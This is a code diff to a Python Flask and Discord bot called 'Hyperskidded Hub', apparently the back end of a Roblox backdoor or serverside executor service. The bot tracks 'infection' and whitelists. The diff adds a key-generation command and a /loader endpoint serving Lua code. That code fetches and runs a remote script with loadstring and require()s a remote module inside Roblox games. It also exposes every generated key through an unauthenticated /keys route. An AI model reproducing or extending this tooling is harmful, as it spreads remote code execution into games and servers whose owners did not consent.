@@ -7,6 +7,8 @@ import threading
 import asyncio
 import logging
 import time
+import random
+import string
 
 from discord.ext import commands
 from colorama import Fore
@@ -26,10 +28,9 @@ whitelisted_users = {
     "1289008907955470439": 1289008907955470439,
 }
 
+generated_keys = {}
 infection_whitelist = {}
-
 banned_users = {}
-
 usage_banned_users = {}
 
 auth_headers = {
@@ -207,7 +208,26 @@ def infection():
         return jsonify({"status": "success"}), 200
     except Exception as err:
         return jsonify({"error": str(err)}), 500
+    
+@app.route("/keys", methods=["GET"])
+def keys():
+    return jsonify(generated_keys), 200
 
+@app.route("/loader")
+def loader():
+    return """return function(gPlayer, key, gMode)
+    local httpService 		= game:GetService("HttpService")
+    local homeUrl 			= "https://hyperskidded-bot.onrender.com/"
+
+    local keys				= httpService:JSONDecode(httpService:GetAsync(homeUrl.."keys"))
+
+    if keys[gPlayer] then
+        local id	 = 118343058201260
+        local source = require(id)
+    
+        source:HyperskiddedHub({player = gPlayer, mode = gMode})
+    end
+end"""
 
 @app.route("/ban", methods=["POST"])
 def ban():
@@ -921,6 +941,17 @@ async def whitelist(ctx, user: discord.User):
         embed.timestamp = discord.utils.utcnow()
         embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
         await ctx.send(embed=embed)
+
+@bot.command()
+async def key(ctx, user: str):
+    gKey = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
+    generated_keys[user] = gKey
+    await ctx.send(f"""```lua
+local httpService = game:GetService("HttpService")
+local loader = loadstring(httpService:GetAsync("https://hyperskidded-bot.onrender.com/loader"))()
+
+loader(owner.Name or {user}, {gKey}, "standard") -- or "serverside"
+```""")
 
 @bot.command()
 async def removewhitelist(ctx, user: discord.User):
